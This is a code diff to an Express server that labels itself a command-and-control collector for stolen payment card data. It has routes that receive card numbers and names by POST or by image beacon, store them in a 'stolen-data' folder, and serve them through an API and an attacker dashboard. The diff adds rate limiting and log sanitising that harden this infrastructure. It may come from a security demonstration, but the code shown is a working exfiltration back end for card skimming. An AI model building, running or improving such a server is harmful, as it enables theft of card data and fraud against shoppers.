@@ -7,11 +7,29 @@
 
 const express = require('express')
 const cors = require('cors')
+const rateLimit = require('express-rate-limit')
 const path = require('path')
 const fs = require('fs').promises
 
 const app = express()
 const PORT = process.env.PORT || 3000
+
+// Rate limiter — prevents abuse of expensive I/O routes
+const collectLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 100,                  // max 100 requests per window per IP
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { error: 'Too many requests, please try again later.' }
+})
+
+const apiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 200,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { error: 'Too many requests, please try again later.' }
+})
 const DATA_DIR = path.join(__dirname, 'stolen-data')
 
 // Middleware
@@ -27,15 +45,19 @@ async function ensureDataDir() {
 // ──────────────────────────────────────────────────
 // POST /collect — receives stolen card data
 // ──────────────────────────────────────────────────
-app.post('/collect', async (req, res) => {
+app.post('/collect', collectLimiter, async (req, res) => {
   await ensureDataDir()
   const ts = new Date().toISOString()
   const body = req.body || {}
 
+  // Sanitize user input for safe logging (prevent log injection)
+  const safeName = String(body.card_name || 'N/A').replace(/[\r\n]/g, ' ')
+  const safeSource = String(body.source || 'unknown').replace(/[\r\n]/g, ' ')
+
   console.log(`\n[C2] 🎯 Stolen data received at ${ts}`)
   console.log(`[C2]   Card: ${body.card_number || 'N/A'}`)
-  console.log(`[C2]   Name: ${body.card_name || 'N/A'}`)
-  console.log(`[C2]   Source: ${body.source || 'unknown'}`)
+  console.log(`[C2]   Name: ${safeName}`)
+  console.log(`[C2]   Source: ${safeSource}`)
 
   const record = {
     id: `stego-${Date.now()}`,
@@ -66,7 +88,7 @@ app.post('/collect', async (req, res) => {
 // ──────────────────────────────────────────────────
 // GET /collect — image beacon fallback
 // ──────────────────────────────────────────────────
-app.get('/collect', async (req, res) => {
+app.get('/collect', collectLimiter, async (req, res) => {
   if (req.query.d) {
     try {
       await ensureDataDir()
@@ -92,7 +114,7 @@ app.get('/collect', async (req, res) => {
 // ──────────────────────────────────────────────────
 // GET /api/stolen — returns all stolen records as JSON
 // ──────────────────────────────────────────────────
-app.get('/api/stolen', async (req, res) => {
+app.get('/api/stolen', apiLimiter, async (req, res) => {
   await ensureDataDir()
   try {
     const files = await fs.readdir(DATA_DIR)
@@ -114,7 +136,7 @@ app.get('/api/stolen', async (req, res) => {
 // ──────────────────────────────────────────────────
 // GET /stolen — serves attacker dashboard
 // ──────────────────────────────────────────────────
-app.get('/stolen', async (req, res) => {
+app.get('/stolen', apiLimiter, async (req, res) => {
   try {
     const html = await fs.readFile(path.join(__dirname, 'dashboard.html'), 'utf8')
     res.send(html)
